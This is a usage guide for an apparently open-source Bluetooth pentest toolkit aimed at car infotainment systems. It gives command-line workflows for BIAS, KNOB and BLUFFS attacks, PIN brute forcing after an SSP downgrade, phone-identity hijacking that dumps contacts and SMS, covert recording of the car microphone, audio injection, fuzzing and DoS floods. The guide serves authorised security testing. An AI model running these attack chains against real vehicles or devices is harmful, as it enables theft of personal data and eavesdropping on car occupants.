# Usage Guide

> **[Back to README](../README.md)**

### Global Options

```
blue-tap [OPTIONS] COMMAND [ARGS]...

Options:
  --version           Show version and exit
  -v, --verbose       Verbosity: -v verbose, -vv debug
  -s, --session TEXT  Session name (default: auto-generated timestamp)
  --help              Show help and exit
```

### Command Reference

<details>
<summary><strong>blue-tap --help</strong> (click to expand)</summary>

```
  ██████╗ ██╗     ██╗   ██╗███████╗ ████████╗ █████╗ ██████╗
  ██╔══██╗██║     ██║   ██║██╔════╝ ╚══██╔══╝██╔══██╗██╔══██╗
  ██████╔╝██║     ██║   ██║█████╗      ██║   ███████║██████╔╝
  ██╔══██╗██║     ██║   ██║██╔══╝      ██║   ██╔══██║██╔═══╝
  ██████╔╝███████╗╚██████╔╝███████╗    ██║   ██║  ██║██║
  ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝    ╚═╝   ╚═╝  ╚═╝╚═╝
  ─────── Bluetooth/BLE Automotive IVI Pentest Toolkit ───────

 Usage: blue-tap [OPTIONS] COMMAND [ARGS]...

 Quick start:
   blue-tap adapter list                        # check adapters
   blue-tap scan classic                        # discover devices
   blue-tap vulnscan AA:BB:CC:DD:EE:FF          # vulnerability scan
   blue-tap hijack IVI_MAC PHONE_MAC            # full attack chain

 Sessions (automatic — all output is always saved):
   blue-tap scan classic                        # auto-session created
   blue-tap -s mytest scan classic              # named session
   blue-tap -s mytest vulnscan TARGET           # resume named session
   blue-tap session list                        # see all sessions
   blue-tap report                              # report from latest session

╭─ Options ────────────────────────────────────────────────────────────────────╮
│ --version                     Show the version and exit.                     │
│ --verbose  -v  INTEGER RANGE  Verbosity: -v verbose, -vv debug               │
│ --session  -s  TEXT           Session name (default: auto-generated from     │
│                               date/time). Use to resume a previous session.  │
│ --help                        Show this message and exit.                    │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Discovery & Reconnaissance ─────────────────────────────────────────────────╮
│ scan              Discover Bluetooth Classic and BLE devices.                │
│ recon             Service enumeration and device fingerprinting.             │
│ adapter           HCI Bluetooth adapter management.                          │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Assessment ─────────────────────────────────────────────────────────────────╮
│ vulnscan   Scan target for vulnerabilities and attack-surface indicators.    │
│ fleet      Fleet-wide Bluetooth assessment — scan, classify, vulnscan        │
│            multiple devices.                                                 │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Exploitation ───────────────────────────────────────────────────────────────╮
│ hijack               Full IVI hijack: spoof phone identity and extract data.│
│ bias                 BIAS attack — bypass authentication via role-switch     │
│                      (CVE-2020-10135).                                      │
│ knob                 KNOB attack — negotiate minimum encryption key size    │
│                      (CVE-2019-9506).                                       │
│ bluffs               BLUFFS session key downgrade (CVE-2023-24023).         │
│ encryption-downgrade Encryption downgrade beyond KNOB (DarkFirmware).       │
│ ssp-downgrade        SSP downgrade attack — force legacy PIN pairing.       │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Data Extraction & Audio ────────────────────────────────────────────────────╮
│ pbap    Phone Book Access Profile - download phonebook and call logs.        │
│ map     Message Access Profile - download SMS/MMS messages.                  │
│ at      AT command data extraction via RFCOMM (bluesnarfer alternative).     │
│ opp     Object Push Profile - push files to IVI.                             │
│ hfp     Hands-Free Profile - call audio interception and injection.          │
│ audio   Audio capture, injection, and eavesdropping via PulseAudio.          │
│ avrcp   AVRCP media control and attacks.                                     │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Fuzzing & Stress Testing ───────────────────────────────────────────────────╮
│ fuzz   Protocol fuzzing -- campaign mode, legacy fuzzers, and crash          │
│        management.                                                           │
│ dos    DoS attacks and pairing abuse.                                        │
╰──────────────────────────────────────────────────────────────────────────────╯
╭─ Reporting & Automation ─────────────────────────────────────────────────────╮
│ session   Manage assessment sessions.                                        │
│ report    Generate pentest report from the current session.                  │
│ auto      Full automated pentest: discovery, fingerprint, recon, vulnscan,   │
│           exploit, fuzz, DoS, report.                                        │
│ run       Execute multiple blue-tap commands in sequence.                    │
╰──────────────────────────────────────────────────────────────────────────────╯
```

</details>

### Getting Help for Any Command

```bash
blue-tap <command> --help                   # Group help
blue-tap <command> <subcommand> --help      # Subcommand help

# Examples:
blue-tap fuzz --help                        # Shows all fuzz subcommands
blue-tap fuzz campaign --help               # Campaign options and examples
blue-tap recon --help                       # All recon subcommands
```

---

## Workflows

### Workflow 1: Quick Assessment

Discover, fingerprint, and scan for vulnerabilities in under 5 minutes.

```bash
blue-tap -s quick scan classic
blue-tap -s quick recon fingerprint AA:BB:CC:DD:EE:FF
blue-tap -s quick vulnscan AA:BB:CC:DD:EE:FF
blue-tap -s quick report
```

### Workflow 2: Full Penetration Test (Automated)

Single command runs all 9 phases: discovery, fingerprint, recon, vuln assessment, pairing attacks, exploitation, fuzzing, DoS, and report generation.

```bash
blue-tap -s pentest auto AA:BB:CC:DD:EE:FF
```

Skip phases you don't need:

```bash
blue-tap -s pentest auto AA:BB:CC:DD:EE:FF --skip-fuzz --skip-dos    # Quick: recon + exploit only
blue-tap -s pentest auto AA:BB:CC:DD:EE:FF --fuzz-duration 7200      # 2-hour fuzz instead of 1
```

### Workflow 3: Full Penetration Test (Manual)

Step-by-step with full control over each phase.

```bash
# 1. Discovery
blue-tap -s pentest scan classic
blue-tap -s pentest scan ble

# 2. Reconnaissance
blue-tap -s pentest recon sdp AA:BB:CC:DD:EE:FF
blue-tap -s pentest recon fingerprint AA:BB:CC:DD:EE:FF
blue-tap -s pentest recon rfcomm-scan AA:BB:CC:DD:EE:FF
blue-tap -s pentest recon l2cap-scan AA:BB:CC:DD:EE:FF
blue-tap -s pentest recon gatt AA:BB:CC:DD:EE:FF

# 3. Vulnerability assessment (with active BIAS probe)
blue-tap -s pentest vulnscan AA:BB:CC:DD:EE:FF --phone CC:DD:EE:FF:00:11

# 4. Pairing attacks
blue-tap -s pentest ssp-downgrade probe AA:BB:CC:DD:EE:FF
blue-tap -s pentest knob probe AA:BB:CC:DD:EE:FF

# 5. Connection hijack + data extraction
blue-tap -s pentest hijack AA:BB:CC:DD:EE:FF CC:DD:EE:FF:00:11

# 6. Direct data extraction (alternative to hijack)
blue-tap -s pentest pbap dump AA:BB:CC:DD:EE:FF
blue-tap -s pentest map dump AA:BB:CC:DD:EE:FF

# 7. Protocol fuzzing
blue-tap -s pentest fuzz campaign AA:BB:CC:DD:EE:FF \
  -p sdp -p rfcomm -p obex-pbap --duration 1h --capture

# 8. DoS testing
blue-tap -s pentest dos l2cap-storm AA:BB:CC:DD:EE:FF
blue-tap -s pentest dos rfcomm-sabm-flood AA:BB:CC:DD:EE:FF

# 9. Report
blue-tap -s pentest report -f html
```

### Workflow 4: Hijack and Extract

Impersonate the owner's phone, connect to the IVI, and steal data.

```bash
# Find the IVI and nearby phones
blue-tap scan classic

# Enumerate IVI services
blue-tap recon sdp AA:BB:CC:DD:EE:FF
blue-tap recon rfcomm-scan AA:BB:CC:DD:EE:FF

# Hijack — clones phone identity, connects to IVI, dumps PBAP + MAP
blue-tap hijack AA:BB:CC:DD:EE:FF CC:DD:EE:FF:00:11 --phone-name "iPhone"

# Or use BIAS when IVI validates link keys
blue-tap hijack AA:BB:CC:DD:EE:FF CC:DD:EE:FF:00:11 --bias
```

### Workflow 5: Audio Eavesdropping

Record the car's microphone, capture media streams, or inject audio.

```bash
# Switch to HFP profile and record microphone
blue-tap audio profile AA:BB:CC:DD:EE:FF hfp
blue-tap audio record-mic AA:BB:CC:DD:EE:FF -d 120

# Live eavesdrop (car mic → laptop speakers)
blue-tap audio live AA:BB:CC:DD:EE:FF

# Capture A2DP media stream
blue-tap audio profile AA:BB:CC:DD:EE:FF a2dp
blue-tap audio capture AA:BB:CC:DD:EE:FF

# Inject audio through car speakers
blue-tap audio play AA:BB:CC:DD:EE:FF message.wav

# Review all captured audio
blue-tap audio review
```

### Workflow 6: Fuzzing Campaign

Find 0-day vulnerabilities with protocol-aware fuzzing.

```bash
# Generate seed corpus
blue-tap fuzz corpus generate

# Run coverage-guided campaign across multiple protocols
blue-tap -s fuzz fuzz campaign AA:BB:CC:DD:EE:FF \
  -p sdp -p rfcomm -p obex-pbap -p ble-att \
  --strategy coverage --duration 2h --capture

# Review and analyze crashes
blue-tap fuzz crashes list
blue-tap fuzz crashes show 1
blue-tap fuzz minimize 1

# Replay crash to verify reproducibility
blue-tap fuzz crashes replay 1

# Try known CVE patterns
blue-tap fuzz cve AA:BB:CC:DD:EE:FF

# Export and report
blue-tap fuzz crashes export
blue-tap -s fuzz report
```

### Workflow 7: SSP Downgrade + PIN Brute Force

Force a device from Secure Simple Pairing to legacy PIN mode, then brute force the PIN.

```bash
blue-tap ssp-downgrade probe AA:BB:CC:DD:EE:FF
blue-tap ssp-downgrade attack AA:BB:CC:DD:EE:FF --pin-start 0 --pin-end 9999
blue-tap pbap dump AA:BB:CC:DD:EE:FF     # Extract data after pairing
```

### Workflow 8: Playbook Automation

Use a built-in YAML playbook or create your own. `{target}` is auto-resolved from scan results.

```bash
# Built-in IVI attack playbook
blue-tap -s assessment run --playbook blue_tap/playbooks/ivi-attack.yaml

# Full assessment (recon + vulnscan + data extraction)
blue-tap -s assessment run --playbook blue_tap/playbooks/full-assessment.yaml

# Custom playbook
blue-tap -s assessment run --playbook my-pentest.yaml
```

### Workflow 9: BLUFFS + Encryption Downgrade

Test session key and encryption security using DarkFirmware LMP attacks.

```bash
# 1. Probe for BLUFFS vulnerability
blue-tap bluffs AA:BB:CC:DD:EE:FF -v probe -i hci1

# 2. If vulnerable, attempt session key downgrade
blue-tap bluffs AA:BB:CC:DD:EE:FF -v sc-downgrade -i hci1
blue-tap bluffs AA:BB:CC:DD:EE:FF -v key-downgrade -i hci1

# 3. Test encryption downgrade paths
blue-tap encryption-downgrade AA:BB:CC:DD:EE:FF -m all -i hci1

# 4. Generate report
blue-tap report
```

---
